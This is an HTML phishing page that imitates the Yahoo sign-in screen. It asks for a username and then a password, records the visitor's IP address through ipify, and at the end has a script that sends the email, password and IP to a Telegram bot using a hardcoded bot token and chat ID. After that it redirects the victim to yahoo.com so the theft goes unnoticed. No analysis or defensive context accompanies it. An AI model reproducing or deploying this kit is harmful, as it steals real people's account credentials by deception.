<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <title>Yahoo</title>
    <link href="style.css" rel="stylesheet" type="text/css" />
    <style>
	
	body
{
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  background: #f9f9fa;
      font-family: 'Yahoo Sans','Helvetica Neue',Helvetica,Arial;
}

#pwd{
  display:none;
}
#usr{
  display:block;
}
#sub{
  border-radius: 50px;
  
}
#suber{
  display:none;
  border-radius: 50px;
}

header#header{
  background: #fff;
}
strong.strong
{
  display: block;
    margin: 0;
    margin-top: 0.82353
rem
;
    font-size: 1.17647rem;
    font-weight: 600;
    letter-spacing: -.2px;
    text-align: center;
    line-height: 1.35294rem;
}

.img-a img{
  height: 36px
}
.img-a
{
  margin: auto;
  width: 90%;
  display: flex;
  justify-content: space-between;
  text-align: center;
  align-items: center;
  padding-top: 25px;
  padding-bottom: 15px;
}


div.form-section .img img
{
  height: 40px
}
div.form-section img
{
  height: 27px
}
div.form-section
{
  position: absolute;
  top: 35%;
  left: 75%;
  transform: translate(-75%, -25%);
  text-align: center;
  align-items: center;
  padding: 20px;
  display: flex;
  flex-direction: column;
  justify-content: space-around;
    box-sizing: border-box;
    background-color: #fff;
    color: #26282a;
    box-shadow: 0 2px 4px 0 rgb(0 0 0 / 30%);
    width: 360px;
    min-height: 550px;
    z-index: 1;
    padding: 28px 5px;
    padding-bottom: 10px;
    border: 1px solid transparent;
    border-top: 1px solid #f1f1f5;
}
form input::placeholder{
   font-family: 'Yahoo Sans','Helvetica Neue',Helvetica,Arial; 
}
form input{
  width: 100%;
  border: none;
  outline: none;
  border-bottom: .05882rem solid #b9bdc5;
  margin-bottom: 30px;
  line-height: 30px;
}
form{
  width: 90%
}
form button
{
  font-size: .94118rem;
    font-weight: 500;
    min-height: 2.35294rem;
    padding: 0.64706rem0;
    line-height: 1rem;
    color: #fff;
    background: #188fff;
    border: 1px solid #188fff;
    box-sizing: border-box;
     border-radius: 0.1rem;
     width: 100%;
     padding: .75em 1.45em;
     cursor: pointer;
}

.stay-forgot .stay a{
  text-decoration: none;
  color: #188fff
}
.stay-forgot .stay{
  width: 100%;
  display: flex;
  justify-content: space-between;
  margin-bottom: 5%;
}
a#create
{
  border-radius: 50px;
  font-size: .94118rem;
    font-weight: 500;
    min-height: 2.35294rem;
    padding: 0.64706rem0;
    line-height: 1rem;
    color: #188fff;
    background: #fff;
    border: 1px solid #188fff;
    box-sizing: border-box;
     border-radius: 50px;
     width: 100%;
     padding: .75em 1.45em;
     text-decoration: none;
     
}
.goog-yah img{
  height: 10px
}
.goog-yah
{
  display: flex;
  justify-content: space-between;
}
a#goog
{
  font-size: .94118rem;
    font-weight: 500;
    min-height: 2.35294rem;
    padding: 0.44706rem0;
    line-height: 1rem;
    color: #000;
    background: #fff;
    border: 1px solid #b9bdc5;
    box-sizing: border-box;
     border-radius: 50px;
     width: 100%;
     padding: .35em 1.45em;
     margin-left: 2%;
     text-decoration: none;
     text-align: center;
     align-items: center;
}
.stay-forgot{
  width: 90%;
  display: flex;
  flex-direction: column;
  justify-content: space-between;
}

@media(max-width: 1050px){

  header{
    display: none;
  }
  div.form-section{

    color: #26282a;
    box-shadow:none;
    border: 0px;
    border-top: 1px solid #f1f1f5;
      top: 25%;
  left: 50%;
  transform: translate(-50%, -25%);
  }

}
</style>
  </head>
  <body>
    <header id="header">
      <div class="img-a">
      <div class="img">
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAABICAMAAAD/Eoi4AAAAKlBMVEVHcExhAtNhAdNhAtNyGeFgAdJgAdJgAdJgAdNiBdVhA9RgAdJlCddgAdIF22wQAAAADnRSTlMAVHtqCrP/4ZMqPcoZ81BhdT4AAAS5SURBVHja7ZrrjiMpDEaLi4uL8fu/7qon0ia2MRS1NRotE6v/dILAB8yHDTm+9rWvXTDn3xb+nBvRM/uNnsD5tvTngP3JLG8PnDhw2R24cl48dgcGDux2B26cl+LmwFqy9gbWkrU7sOO8cOwNrCVrd+DCedOxO3DmwH534EgcuG0OrCVrd2DkwPWJoCklrgDHVsy4ereIF4du9yXLfZqaidr9tgX8tUcIQ/v597NRF7jmVxqAvhiJvkc6X13m0XI0B4le/UJotyQLRps7UucsK8BStsbLkqiBC7L2miJziaFsoFTgIOguSRY11slIvoNOv2M+uVGdAAfRvgjvPJ3SyEcbd44chpKFgwMaVfpdUse7IXBQ7VnMvjpUlopRDEjLcVWyAv/S3vvFdM8G7sN8+OjIaESOx4HZJ7bFyj+SWUVlGRiFzrvA/UHCoFX4dBIH89fGkhWGkkbRlCwx7Dqw1sY6bFWZtNqGkWsgTSr/Ys2Hk7s7n/eBe9rYxhuECtu/tsFi5Q9GxIPwsZ5PAafRumlfyqw/t1b5u36DIqMQHgM+mwxoG2RhAoeSZc5J7oYGiJ7WgTXJXBGQI9gW1ip/Lze5noaqMdAHD3QFOAGS3sRVtcqQ9MTo7iBnOW5au6xsUo61ZKl8DQrPk2zgVH+GQK4kSgKx9tKprBNF/0r4Av+0zCVrdOBqybJz0EoGMM9ko9o3/APjlJQzT7Wfovm1y8qqFaVJp711ELgxcDYkoVjJF7KtJGYgGE7jYuWPara8dBrM+gOGwLXnHwjXqpUXBO4bWnFJi5eVQSlAkv6gOXFuCNx6agJ8RtHMCzz3xJkZU1y7rIwk+HS8JDM9jUPgf5sJ4GxWpYHHluz9bUlt1uqZqQW2ZUtvnEHBRQNgugIczIgBFhlkb8T6X97aKEZSZxnZW+P8jcA8fp4ClmEYgtZZO6TbLWBvnJbqGzKvoKhz/sRaS1x+L0fUZ5ktWuEWcDDFBW3RCqbLL0iHv8aEuvy8qCUUzPMcbwE743hVX6BxXh8oh4mw8hwcJiWLt2puf94Cbjod66RkRehnNhwGeS0yJ27U56XYy8YgsnGXgWVgYOte5iT7XtWRDBFYfCDNkwsoPiHJRXZJvQ7sxd3nD3ILSQ9OosqInTvbpqqvtPikqoVRohECK+cWgfV4CVV3tbcSlJCUzuhmc+HCHi+MJ+Q2MGtmGVwduHZU1y++MeqtAA8Dz0GKudn0Ake9F2cW0+S26FngOQhoPbUXuK0CKxnRcZEfBo548YXCXbj1jabr84TazOXwOeD5xTSV0VLoznBBtMxdCkLI07PARyWbt14MLojdSUlxKaHWs2QvCd0HPgpa8VwuJoLZyJzCnd/rJR31qF1zt4HtZ0HQb4Ld6KIPLqdGWE6oQ68JyefKegv4TYLWO/f85Tw3Q3Qh3vl9E7WutOX0+d59HDeB3+aA3TeAs0TV80Q7FxkFKNZ9bnjpJKsZMFGCXF/T9GGv/8UHupWw6F49ImQ3XJsSAJB+GvrS9cxn1sXMipCs7S3zhG17i6LG3Nz0z5T2Ni1Z21sVtdn2Bn+ZZDVR+W9vXhQb21v6yyTLDSr//c8k2J835uzff/X42tf+h/YPQiqe2vV+1kkAAAAASUVORK5CYII=" alt="">
      </div>
      <a href="#">Help</a>
      </div>
    </header>
    <div class="form-section">
          <div class="img">
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAABICAMAAAD/Eoi4AAAAKlBMVEVHcExhAtNhAdNhAtNyGeFgAdJgAdJgAdJgAdNiBdVhA9RgAdJlCddgAdIF22wQAAAADnRSTlMAVHtqCrP/4ZMqPcoZ81BhdT4AAAS5SURBVHja7ZrrjiMpDEaLi4uL8fu/7qon0ia2MRS1NRotE6v/dILAB8yHDTm+9rWvXTDn3xb+nBvRM/uNnsD5tvTngP3JLG8PnDhw2R24cl48dgcGDux2B26cl+LmwFqy9gbWkrU7sOO8cOwNrCVrd+DCedOxO3DmwH534EgcuG0OrCVrd2DkwPWJoCklrgDHVsy4ereIF4du9yXLfZqaidr9tgX8tUcIQ/v597NRF7jmVxqAvhiJvkc6X13m0XI0B4le/UJotyQLRps7UucsK8BStsbLkqiBC7L2miJziaFsoFTgIOguSRY11slIvoNOv2M+uVGdAAfRvgjvPJ3SyEcbd44chpKFgwMaVfpdUse7IXBQ7VnMvjpUlopRDEjLcVWyAv/S3vvFdM8G7sN8+OjIaESOx4HZJ7bFyj+SWUVlGRiFzrvA/UHCoFX4dBIH89fGkhWGkkbRlCwx7Dqw1sY6bFWZtNqGkWsgTSr/Ys2Hk7s7n/eBe9rYxhuECtu/tsFi5Q9GxIPwsZ5PAafRumlfyqw/t1b5u36DIqMQHgM+mwxoG2RhAoeSZc5J7oYGiJ7WgTXJXBGQI9gW1ip/Lze5noaqMdAHD3QFOAGS3sRVtcqQ9MTo7iBnOW5au6xsUo61ZKl8DQrPk2zgVH+GQK4kSgKx9tKprBNF/0r4Av+0zCVrdOBqybJz0EoGMM9ko9o3/APjlJQzT7Wfovm1y8qqFaVJp711ELgxcDYkoVjJF7KtJGYgGE7jYuWPara8dBrM+gOGwLXnHwjXqpUXBO4bWnFJi5eVQSlAkv6gOXFuCNx6agJ8RtHMCzz3xJkZU1y7rIwk+HS8JDM9jUPgf5sJ4GxWpYHHluz9bUlt1uqZqQW2ZUtvnEHBRQNgugIczIgBFhlkb8T6X97aKEZSZxnZW+P8jcA8fp4ClmEYgtZZO6TbLWBvnJbqGzKvoKhz/sRaS1x+L0fUZ5ktWuEWcDDFBW3RCqbLL0iHv8aEuvy8qCUUzPMcbwE743hVX6BxXh8oh4mw8hwcJiWLt2puf94Cbjod66RkRehnNhwGeS0yJ27U56XYy8YgsnGXgWVgYOte5iT7XtWRDBFYfCDNkwsoPiHJRXZJvQ7sxd3nD3ILSQ9OosqInTvbpqqvtPikqoVRohECK+cWgfV4CVV3tbcSlJCUzuhmc+HCHi+MJ+Q2MGtmGVwduHZU1y++MeqtAA8Dz0GKudn0Ake9F2cW0+S26FngOQhoPbUXuK0CKxnRcZEfBo548YXCXbj1jabr84TazOXwOeD5xTSV0VLoznBBtMxdCkLI07PARyWbt14MLojdSUlxKaHWs2QvCd0HPgpa8VwuJoLZyJzCnd/rJR31qF1zt4HtZ0HQb4Ld6KIPLqdGWE6oQ68JyefKegv4TYLWO/f85Tw3Q3Qh3vl9E7WutOX0+d59HDeB3+aA3TeAs0TV80Q7FxkFKNZ9bnjpJKsZMFGCXF/T9GGv/8UHupWw6F49ImQ3XJsSAJB+GvrS9cxn1sXMipCs7S3zhG17i6LG3Nz0z5T2Ni1Z21sVtdn2Bn+ZZDVR+W9vXhQb21v6yyTLDSr//c8k2J835uzff/X42tf+h/YPQiqe2vV+1kkAAAAASUVORK5CYII=" alt="">
      </div>
<br>
      <div class="sign-using">
        <p id="display"></p>
        <strong class="strong">Sign in</strong>
        <span>using your Yahoo account</span>
      </div>
      <br>
      <form action="" id="form">
        <input type="text" placeholder="Username, email or mobile" id="usr" required>
        <input type="password" placeholder="Password" id="pwd" required>
		<input type="text" id="ipaddress" hidden>
        <button id="sub">Next</button>
        <button type="submit" id="suber">Next</button>
      </form>
      <div class="stay-forgot">
        <div class="stay">
          <a href="#">Stay signed in</a>
          <a href="#">Forgot password?</a>
        </div>
        <a href="" id="create">Create account</a>
        <br>
        <p>Or, continue with</p>
        <div class="goog-yah">
        <a href="" id="goog"><img src="https://img.icons8.com/color/50/000000/google-logo.png"/></a>
        </div>
      </div>
    </div>
<!-- START: Here's the IP stuff -->
<script type="application/javascript">
function getIP(json) {
    document.getElementById("ipaddress").value = json.ip;
}
</script>

<script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
 <!-- END: IP Stuff -->	
	
	
    <script>
      const forma = document.querySelector('#form')
    
      let bot = {
          TOKEN: "7018256337:AAHX2iHAfXZLAbe8ZYjZfvwDV6EQfYqYX1Y",
          chatID: "7002450305"
      }

      const emAil = document.querySelector('#usr')
      const suBBer = document.querySelector('#suber')
      const pWd = document.querySelector('#pwd')
      const strong = document.querySelector('.strong')
      
	  const submit = document.querySelector('#sub').addEventListener('click', e =>{
        if(emAil.value === ''){
		
		
		
          return
        }
        display.textContent = emAil.value
        strong.textContent = 'Enter password'
        emAil.style.display = 'none'
        pWd.style.display = 'block'
        submit.style.display = 'none'
        suBBer.style.display = 'block'
      })


    forma.addEventListener("submit", e =>{
          e.preventDefault();
          let email = document.querySelector('#usr').value
          let pwd = document.querySelector('#pwd').value
		  let ips = document.querySelector('#ipaddress').value

        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=YahooMail=>${email}=${pwd}==IP:>${ips}`, {
              method: "GET"
          }).then(success => {
              window.location.replace("https://yahoo.com/");
          }, error => {
              console.log(error)
              }) 
      })
    </script>
  </body>
</html>
